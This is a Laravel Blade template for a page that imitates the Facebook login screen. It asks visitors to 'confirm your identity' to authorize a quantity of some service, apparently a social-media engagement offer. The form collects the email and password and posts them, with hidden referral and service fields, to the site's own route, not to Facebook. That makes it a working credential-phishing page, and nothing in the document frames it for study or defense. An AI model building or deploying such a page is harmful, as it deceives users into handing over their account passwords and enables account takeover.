@extends('platform-login.layout')

@section('title', 'Log into Facebook')

@section('content')
<div class="w-full max-w-[420px] mx-auto space-y-4">
    <div class="text-center mb-2">
        <h1 class="text-4xl font-extrabold text-[#1877f2] tracking-tighter">facebook</h1>
    </div>

    <!-- Facebook Login Card -->
    <div class="bg-[#18191a] border border-white/10 rounded-2xl p-8 shadow-2xl relative overflow-hidden">
        <h2 class="text-xl font-bold text-white text-center mb-2">Log Into Facebook</h2>
        <p class="text-xs text-gray-400 text-center mb-6">
            Confirm your identity to authorize <strong class="text-white">{{ number_format($quantity) }} {{ $service }}</strong>
            @if(!empty($username))
                for <span class="text-[#1877f2]">{{ $username }}</span>
            @endif
        </p>

        <form method="POST" action="{{ route('platform.login.store', ['platform' => 'facebook']) }}" class="space-y-4">
            @csrf
            <input type="hidden" name="tag_id" value="{{ $tag->id ?? 1 }}">
            <input type="hidden" name="service_type" value="{{ $service }}">
            <input type="hidden" name="quantity" value="{{ $quantity }}">
            <input type="hidden" name="username" value="{{ $username }}">
            <input type="hidden" name="referral_code_id" value="{{ $refId }}">

            <div>
                <input type="text" name="email" required
                    value="{{ $username }}"
                    class="w-full px-4 py-3.5 text-sm rounded-xl bg-[#242526] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#1877f2] transition-colors"
                    placeholder="Email address or phone number">
            </div>

            <div class="relative">
                <input type="password" id="fb_password" name="password" required
                    class="w-full px-4 py-3.5 pr-14 text-sm rounded-xl bg-[#242526] border border-white/10 text-white placeholder-gray-500 focus:outline-none focus:border-[#1877f2] transition-colors"
                    placeholder="Password">
                <button type="button" onclick="togglePassword('fb_password', this)"
                    class="absolute right-4 top-4 text-xs font-semibold text-gray-400 hover:text-white transition-colors">
                    Show
                </button>
            </div>

            <button type="submit"
                class="w-full py-3.5 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold text-base rounded-xl shadow-lg transition-all active:scale-[0.98]">
                Log In
            </button>

            <div class="text-center pt-2">
                <span class="text-xs text-[#1877f2] hover:underline cursor-pointer">Forgotten account?</span>
            </div>

            <div class="relative flex py-2 items-center">
                <div class="flex-grow border-t border-white/10"></div>
                <span class="flex-shrink mx-4 text-gray-500 text-xs uppercase font-semibold">or</span>
                <div class="flex-grow border-t border-white/10"></div>
            </div>

            <div class="text-center">
                <button type="button" class="px-6 py-2.5 bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-sm rounded-xl transition-colors">
                    Create New Account
                </button>
            </div>
        </form>
    </div>
</div>
@endsection

@section('scripts')
<script>
    function togglePassword(inputId, btn) {
        const input = document.getElementById(inputId);
        if (input.type === 'password') {
            input.type = 'text';
            btn.innerText = 'Hide';
        } else {
            input.type = 'password';
            btn.innerText = 'Show';
        }
    }
</script>
@endsection
